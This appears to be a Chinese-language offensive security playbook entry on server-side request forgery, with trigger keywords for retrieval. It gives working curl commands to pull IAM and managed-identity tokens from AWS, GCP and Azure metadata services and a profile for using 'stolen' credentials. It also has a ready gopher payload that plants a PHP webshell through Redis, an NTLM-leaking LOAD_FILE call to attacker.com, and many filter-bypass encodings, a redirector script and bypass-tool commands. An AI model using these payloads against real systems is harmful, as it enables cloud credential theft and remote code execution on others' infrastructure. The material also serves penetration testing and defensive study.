---
category: web
tags: [ssrf, server_side_request_forgery, 服务端请求伪造, imds, metadata, gopher, dns_rebinding, cloud_ssrf, url_bypass, 云元数据, aws, gcp, azure]
triggers: [ssrf, url=, fetch, curl, request, proxy, webhook, redirect, 169.254.169.254, metadata, "gopher://", "file://", 服务端请求伪造, server-side request forgery, internal, localhost, load_file, imds]
related: [sqli, xxe, command_injection, cloud/aws_lambda_enum, websocket, oauth]
---

# 服务端请求伪造 (SSRF)

## 什么时候用

应用接受用户提供的 URL 或地址，在服务端发起 HTTP/TCP 请求。常见于：

- URL 预览/缩略图生成（`url=`、`image_url=`）
- Webhook 配置
- 文件导入（从 URL 导入 CSV/PDF）
- 代理/转发功能
- PDF/HTML 渲染（wkhtmltopdf、Puppeteer）
- SQL 注入中的 `LOAD_FILE()` 侧通道

## 前提条件

- 服务端根据用户输入发起网络请求
- 目标网络可达内部服务（metadata、Redis、数据库等）
- 没有或能绕过 URL/IP 白名单、黑名单校验

## 攻击步骤

### 1. 基本探测

确认 SSRF 存在——让服务端访问你控制的地址：

```bash
# Burp Collaborator / interactsh / webhook.site
curl "https://target.com/api/fetch?url=https://YOUR-CALLBACK.oastify.com"
```

确认后尝试访问内部服务：

```bash
# 访问 localhost
curl "https://target.com/api/fetch?url=http://127.0.0.1/"

# 访问云 metadata
curl "https://target.com/api/fetch?url=http://169.254.169.254/latest/meta-data/"
```

### 2. 云环境 IMDS 利用

#### AWS EC2 — IMDSv1（最危险，GET 即可）

```bash
# 获取 IAM 角色名
http://169.254.169.254/latest/meta-data/iam/security-credentials/

# 获取临时凭据（AccessKey + SecretKey + Token）
http://169.254.169.254/latest/meta-data/iam/security-credentials/<ROLE_NAME>

# 获取 user-data（常含硬编码密码/密钥）
http://169.254.169.254/latest/user-data

# 获取实例身份文档（含 accountId、region）
http://169.254.169.254/latest/dynamic/instance-identity/document
```

拿到凭据后配置 AWS CLI：

```ini
[stolen]
aws_access_key_id = ASIA6GG71...
aws_secret_access_key = a5kssI2I4H/atUZOwBr5...
aws_session_token = AgoJb3JpZ2luX2VjEGc...
```

```bash
aws sts get-caller-identity --profile stolen
aws s3 ls --profile stolen
```

#### AWS EC2 — IMDSv2（需要 PUT + Header）

IMDSv2 需要先 PUT 获取 Token，普通 SSRF（只能 GET）无法利用。但如果 SSRF 支持自定义方法和 Header：

```bash
TOKEN=$(curl -X PUT "http://169.254.169.254/latest/api/token" \
  -H "X-aws-ec2-metadata-token-ttl-seconds: 21600")

curl -H "X-aws-ec2-metadata-token: $TOKEN" \
  "http://169.254.169.254/latest/meta-data/iam/security-credentials/"
```

> IMDSv2 额外限制：hop limit=1（容器内不可达）、阻止含 `X-Forwarded-For` 的请求。

#### AWS ECS（容器服务）

```bash
# GUID 在环境变量 AWS_CONTAINER_CREDENTIALS_RELATIVE_URI 中
# 可通过 file:///proc/self/environ 路径遍历读取

curl "http://169.254.170.2$AWS_CONTAINER_CREDENTIALS_RELATIVE_URI"
```

#### AWS Lambda

凭据在环境变量中，用 `file:///proc/self/environ` 读取：

- `AWS_SESSION_TOKEN`
- `AWS_SECRET_ACCESS_KEY`
- `AWS_ACCESS_KEY_ID`

Lambda 事件数据：

```
http://localhost:9001/2018-06-01/runtime/invocation/next
```

#### AWS Elastic Beanstalk

```
http://169.254.169.254/latest/dynamic/instance-identity/document
http://169.254.169.254/latest/meta-data/iam/security-credentials/aws-elasticbeanorastalk-ec2-role
```

#### GCP — 需要自定义 Header

GCP metadata 要求 `Metadata-Flavor: Google` Header（纯 GET SSRF 无法利用，除非用 v1beta1）：

```bash
# v1（需要 Header）
curl -H "Metadata-Flavor: Google" \
  "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token"

curl -H "Metadata-Flavor: Google" \
  "http://metadata.google.internal/computeMetadata/v1/project/project-id"

# v1beta1（不需要 Header！）
http://metadata.google.internal/computeMetadata/v1beta1/
http://metadata.google.internal/computeMetadata/v1beta1/?recursive=true
```

可用的 metadata 地址：
- `http://169.254.169.254`
- `http://metadata.google.internal`
- `http://metadata`

获取 token 后使用：

```bash
export CLOUDSDK_AUTH_ACCESS_TOKEN=<token>
gcloud projects list
```

#### Azure — 需要 `Metadata: true` Header

```bash
curl -H "Metadata:true" \
  "http://169.254.169.254/metadata/instance?api-version=2021-12-13"

# 获取 management token
curl -H "Metadata:true" \
  "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2021-12-13&resource=https://management.azure.com/"

# 获取 graph token
curl -H "Metadata:true" \
  "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2021-12-13&resource=https://graph.microsoft.com/"

# 获取 vault token
curl -H "Metadata:true" \
  "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2021-12-13&resource=https://vault.azure.net/"
```

> Azure 的 `http://169.254.169.254/metadata/v1/instanceinfo` 不需要 `Metadata: true` Header，SSRF 场景下优先尝试。

Azure App Service / Functions 使用环境变量 `IDENTITY_ENDPOINT` + `IDENTITY_HEADER`：

```bash
curl "$IDENTITY_ENDPOINT?resource=https://management.azure.com/&api-version=2019-08-01" \
  -H "X-IDENTITY-HEADER:$IDENTITY_HEADER"
```

#### 其他云平台

| 平台 | Metadata 端点 | Header 要求 |
|------|--------------|-------------|
| Digital Ocean | `http://169.254.169.254/metadata/v1.json` | 无 |
| Alibaba | `http://100.100.100.200/latest/meta-data/` | 无 |
| Oracle | `http://192.0.0.192/latest/meta-data/` | 无 |
| IBM Cloud | `http://169.254.169.254/instance_identity/v1/token` | `Metadata-Flavor: ibm` |
| OpenStack | `http://169.254.169.254/openstack` | 无 |

### 3. Gopher 协议利用

gopher 可以构造任意 TCP 数据包，用于攻击不支持 HTTP 的内部服务：

```bash
# 攻击内部 Redis（写 webshell）
gopher://127.0.0.1:6379/_%2A1%0D%0A%248%0D%0Aflushall%0D%0A%2A3%0D%0A%243%0D%0Aset%0D%0A%241%0D%0A1%0D%0A%2434%0D%0A%0A%0A%3C%3Fphp%20system%28%24_GET%5B%27cmd%27%5D%29%3B%3F%3E%0A%0A%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%243%0D%0Adir%0D%0A%2413%0D%0A/var/www/html%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%2410%0D%0Adbfilename%0D%0A%249%0D%0Ashell.php%0D%0A%2A1%0D%0A%244%0D%0Asave%0D%0A

# 攻击 MySQL（无密码认证时）
gopher://127.0.0.1:3306/...

# 攻击 SMTP（发邮件）
gopher://127.0.0.1:25/...
```

> 工具 [Gopherus](https://github.com/tarunkant/Gopherus) 可自动生成 gopher payload（Redis、MySQL、FastCGI、Memcached 等）。

### 4. MySQL SSRF（通过 SQL 注入）

当拿到 SQL 注入且 `secure_file_priv=""` 时，`LOAD_FILE()` 可触发 SSRF：

```sql
-- Windows 上可通过 UNC 路径泄漏 NTLMv2 hash
SELECT LOAD_FILE('\\\\attacker.com\\share\\file');

-- 通过 UDF 执行 HTTP 请求
CREATE FUNCTION http_get RETURNS STRING SONAME 'lib_mysqludf_sys.so';
SELECT http_get('http://169.254.169.254/latest/meta-data/');
```

> 限制：UNC 路径仅限 TCP 445，Linux 上 `LOAD_FILE()` 不支持网络路径。

## URL 过滤绕过

### IP 地址变形

```bash
# 十进制
http://2130706433/          # = 127.0.0.1
http://3232235521/          # = 192.168.0.1

# 八进制
http://0177.0000.0000.0001  # = 127.0.0.1

# 十六进制
http://0x7f000001/          # = 127.0.0.1

# 混合编码
http://0x7f.0x00.0x00.0x01
169.254.43518               # 部分十进制（Class B 格式）
0xA9.254.0251.0376          # 混合十六进制+十进制+八进制

# IPv6
http://[::1]/               # = 127.0.0.1
http://[::]:80/
http://[0000::1]:80/
http://[0:0:0:0:0:ffff:127.0.0.1]/

# 极简形式
http://0/                   # Linux 上 0 = localhost
http://127.1/
http://127.0.1/
```

### DNS 指向 localhost

```bash
localtest.me                              # → 127.0.0.1
spoofed.burpcollaborator.net              # → 127.0.0.1
customer1.app.localhost.my.company.127.0.0.1.nip.io  # → 127.0.0.1
1ynrnhl.xip.io                            # → 169.254.169.254
```

### URL 解析差异（Backslash trick）

WHATWG 标准把 `\` 等同于 `/`，RFC3986 不认。利用两者差异：

```bash
# 反斜杠混淆
http://attacker.com\@victim.com
http://victim.com\@attacker.com

# userinfo 混淆
https://{domain}@attacker.com
https://attacker.com@{domain}

# 左方括号混淆（Spring CVE-2024-22243）
https://example.com\[@internal

# null byte / 编码混淆
attacker%00.com
attacker%E3%80%82com               # Unicode 句号
```

### DNS Rebinding

绕过"先解析再请求"的单次 DNS 校验：

1. 注册域名指向公网 IP → 通过白名单/CIDR 检查
2. 设极低 TTL，在真正请求前把 DNS 重绑定到 `127.0.0.1` 或 `169.254.169.254`
3. 工具：[Singularity](https://github.com/nccgroup/singularity)

```bash
python3 singularity.py --lhost <your_ip> --rhost 127.0.0.1 \
  --domain rebinder.test --http-port 8080
```

### 重定向绕过

服务端校验原始 URL 但跟随 302 重定向：

```python
#!/usr/bin/env python3
import sys
from http.server import HTTPServer, BaseHTTPRequestHandler

class Redirect(BaseHTTPRequestHandler):
    def do_GET(self):
        self.send_response(302)
        self.send_header('Location', sys.argv[2])
        self.end_headers()

HTTPServer(("", int(sys.argv[1])), Redirect).serve_forever()
```

```bash
python3 redirector.py 8000 http://169.254.169.254/latest/meta-data/
# 然后提交: url=http://your-server:8000/
```

### IPv6 Zone Identifier（%25）

部分过滤器不解析 RFC 6874 zone id：

```
http://[fe80::1%25eth0]/
http://[fe80::a9ff:fe00:1%25en0]/
```

### 路径/扩展名限制绕过

```
https://metadata/vulnerable/path#/expected/path
https://metadata/vulnerable/path#.extension
https://metadata/expected/path/..%2f..%2f/vulnerable/path
```

### 自动化工具

```bash
# SSRF-PayloadMaker — 生成 80k+ 绕过组合
python3 ssrf_maker.py --allowed example.com --attacker attacker.com -A -o payloads.txt

# Gopherus — 生成 gopher payload
python3 gopherus.py --exploit redis
```

## 常见坑

- **IMDSv2 vs IMDSv1**：AWS 默认可能已开启 IMDSv2，普通 GET SSRF 无法获取 token；需确认目标是否仍允许 IMDSv1
- **GCP/Azure 需要自定义 Header**：纯 URL SSRF 无法添加 Header 时，试 GCP 的 `v1beta1` 端点（不需要 Header）
- **gopher 协议被禁**：现代 HTTP 客户端（如 Go 的 `net/http`）已移除 gopher 支持；PHP 的 `curl` + Python 的 `urllib`/`requests` 行为各异
- **302 重定向不跟随**：某些 HTTP 库默认不跟随重定向，或跟随时会丢弃 gopher:// scheme
- **DNS rebinding 时间窗口**：需要两次 DNS 解析间隔足够让 TTL 过期，Java DNS 缓存默认无限
- **SSRF 无回显**：用时间盲注（内网端口开放 vs 关闭的响应时间差）或 OOB（DNS/HTTP callback）确认
- **`LOAD_FILE()` 的 `secure_file_priv`**：MySQL 5.7+ 默认限制为 `/var/lib/mysql-files/`，需为空才能 SSRF
- **云 metadata token 有时效**：AWS STS 临时凭据一般 6-12 小时过期，拿到后尽快利用

## 变体

| 变体 | 说明 |
|------|------|
| Blind SSRF | 无回显，只能通过时间差/OOB 确认 |
| Semi-blind SSRF | 返回状态码或内容长度但不返回 body |
| Full-read SSRF | 完整返回响应内容 |
| SSRF → RCE | 通过 gopher 攻击 Redis/FastCGI/Memcached 等 |
| SSRF via SQL | `LOAD_FILE()` / UDF |
| SSRF via XXE | `<!ENTITY xxe SYSTEM "http://internal/">` |
| SSRF via PDF 渲染 | wkhtmltopdf / Puppeteer headless 访问内部 URL |
| DNS Rebinding | 绕过单次解析的 IP 校验 |
| SSRF via XSLT | `document()` 函数可发起外部请求 |

## 近年重要 CVE

| 年份 | CVE | 组件 | 概要 |
|------|-----|------|------|
| 2025 | CVE-2025-0454 | Python autogpt | `http://localhost:\\@google.com/../` 解析混淆绕过白名单 |
| 2025 | CVE-2025-2691 | Node nossrf | 只校验域名不校验解析后 IP，DNS rebinding 可绕过 |
| 2024 | CVE-2024-29415 | Node ip 包 | `isPublic('0127.0.0.1')` 误判为公网地址 |
| 2024 | CVE-2024-3095 | Langchain | WebResearchRetriever 无 host 过滤，可达 IMDS |
| 2024 | CVE-2024-22243 | Spring UriComponentsBuilder | `[` in userinfo 解析差异 |
| 2023 | CVE-2023-27592 | urllib3 | 反斜杠混淆绕过 host 校验 |

## 相关技术

- [[sqli]] — SQL 注入中 `LOAD_FILE()` 可触发 SSRF
- [[xxe]] — XXE 外部实体可发起 SSRF
- [[command_injection]] — SSRF 拿到云凭据后常配合命令注入
- [[cloud/aws_lambda_enum]] — AWS Lambda 环境下的凭据获取
